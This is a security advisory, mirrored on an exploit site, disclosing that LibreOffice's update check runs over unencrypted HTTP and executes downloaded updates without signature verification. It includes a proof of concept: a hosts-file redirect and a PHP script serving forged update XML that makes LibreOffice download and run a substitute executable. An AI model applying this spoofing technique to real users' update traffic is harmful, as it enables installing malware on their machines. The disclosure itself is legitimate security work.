@@ -1,0 +1,115 @@
+id: 20543
+date: 03/22/2013
+title: LibreOffice 4.0.1.2 Update Spoofing Vulnerability
+author: waraxe
+cves: 
+
+Update Spoofing Vulnerability in LibreOffice 4.0.1.2
+====================================================
+
+Author: Janek Vind "waraxe"
+Date: 21. March 2013
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-99.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+LibreOffice is a free and open source office suite, developed by The Document
+Foundation. It is descended from OpenOffice.org, from which it was forked in 2010.
+The LibreOffice suite includes a word processor, spreadsheet, graphics editor,
+slideshow creator, database and math formula writer.
+
+http://www.libreoffice.org/
+
+Affected are versions 3.5.1 to newest 4.0.1.2, older versions were not tested.
+
+###############################################################################
+1. Update Spoofing Vulnerability
+###############################################################################
+
+It appears, that current version of LibreOffice contains security vulnerability
+in update mechanism, which can be exploited by malicious people to conduct
+spoofing attacks.
+
+When checking for updates, LibreOffice issues GET request over HTTP:
+
+GET /check.php HTTP/1.1
+Connection: TE, close
+TE: trailers
+Host: update.libreoffice.org
+Accept-Encoding: gzip
+Pragma: no-cache
+Accept-Language: en-US
+User-Agent: LibreOffice 4.0 .0.3 (7545bee9c2a0782548772a21bc84a9dcc583b89;
+ Windows; x86; BundledLanguages=en-US af am ar as ast be bg bn bn-IN bo ...)
+
+
+Server at "update.libreoffice.org" responds with XML data:
+
+<?xml version="1.0" encoding="utf-8"?>
+<inst:description xmlns:inst="http://update.libreoffice.org/description">
+  <inst:id>LibreOffice 4.0.1</inst:id>
+  <inst:gitid>84102822e3d61eb989ddd325abf1ac077904985</inst:gitid>
+  <inst:os>Windows</inst:os>
+  <inst:arch>x86</inst:arch>
+  <inst:version>4.0.1</inst:version>
+  <inst:buildid>9999</inst:buildid>
+  <inst:update type="text/html" src="http://www.libreoffice.org/download/" />
+</inst:description>
+
+
+LibreOffice user can click "Download" and "Install" buttons and LibreOffice
+will download and install the update.
+
+Such update mechanism contains two security flaws:
+
+1. Update check is done over unencrypted HTTP channel. Malicious third party
+is able to conduct Man-in-the-Middle (MitM) attacks and spoof server response.
+In this way it is possible to instruct LibreOffice to download malicious update.
+
+2. LibreOffice will execute downloaded update without digital signature
+verification.
+
+Testing: tests were done using Windows 7, Apache and PHP. Steps:
+
+1. modify "windows/system32/drivers/etc/hosts" file in order to emulate
+DNS spoofing:  127.0.0.1 update.libreoffice.org
+
+2. create php file "check.php" to the webserver main directory:
+
+<?php
+echo '<?xml version="1.0" encoding="utf-8"?>
+<inst:description xmlns:inst="http://update.libreoffice.org/description">
+  <inst:id>LibreOffice 5.6.7</inst:id>
+  <inst:gitid>123456789</inst:gitid>
+  <inst:os>Windows</inst:os>
+  <inst:arch>x86</inst:arch>
+  <inst:version>5.6.7</inst:version>
+  <inst:buildid>9999</inst:buildid>
+  <inst:update type="application/octet-stream" src="http://localhost/notepad.exe" />
+</inst:description>';
+?>
+
+3. Place "notepad.exe" file to the webserver main directory.
+
+4. Open LibreOffice Writer -> Help -> Check For Updates
+
+Response: LibreOffice 5.6.7 is available.
+
+5. Press "Download" button. Successful download ends with response:
+
+Download of LibreOffice 5.6.7 completed. Ready for installation.
+
+6. Press "Install" button, choose "Yes" and after that Notepad will be opened.
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+#  0day.today [2023-03-22]  #
